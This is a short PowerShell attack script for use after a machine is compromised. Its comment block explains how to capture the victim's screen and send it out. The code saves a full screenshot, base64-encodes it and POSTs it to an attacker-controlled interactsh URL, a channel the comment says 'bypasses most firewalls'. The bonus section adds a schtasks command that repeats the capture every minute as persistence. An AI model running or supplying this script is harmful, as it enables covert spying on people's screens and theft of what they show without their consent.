<#
   This script will make a screenshot and send it over HTTP to your interactsh server. Handy if you have a remote (powershell) shell and want to see what the victim is doing.
   For pentesting this is recommend too because it gets the non-tech people excited because it's visual. 
   Bypasses most firewalls.
   Go to https://app.interactsh.com/ and copy the interactsh URL and adjust it in the script.
   
   Your incoming screenshots are bmp files and base64 encoded. Copy the payload and paste them on this site:   https://base64.guru/converter/decode/image/bmp 
   or google something like "bmp base64 decode". Everything has an online tool now... 
   
   ---------- Bonus ----------
   Bonus points for making a screenshot every minute:
   cmd /k "schtasks /create /tn 'screenshot' /tr %PUBLIC%\screenshot.ps1 /sc minute /mo 1" 
   Please note that this might pop-up every minute, pull requests welcome to make a fix for this. 
#>

$File = "$Env:PUBLIC\Screenshot1.bmp" 
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width*2
$Height = $Screen.Height*2
$Left = $Screen.Left
$Top = $Screen.Top
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
$bitmap.Save($File)
$uri = "http://XXXXX.interactsh.com"          #   <------- EDIT THIS URL ------------- 
$b64txt = [convert]::ToBase64String((Get-Content -path $File -Encoding byte))
Invoke-WebRequest -uri $uri -Method Post -Body $b64txt
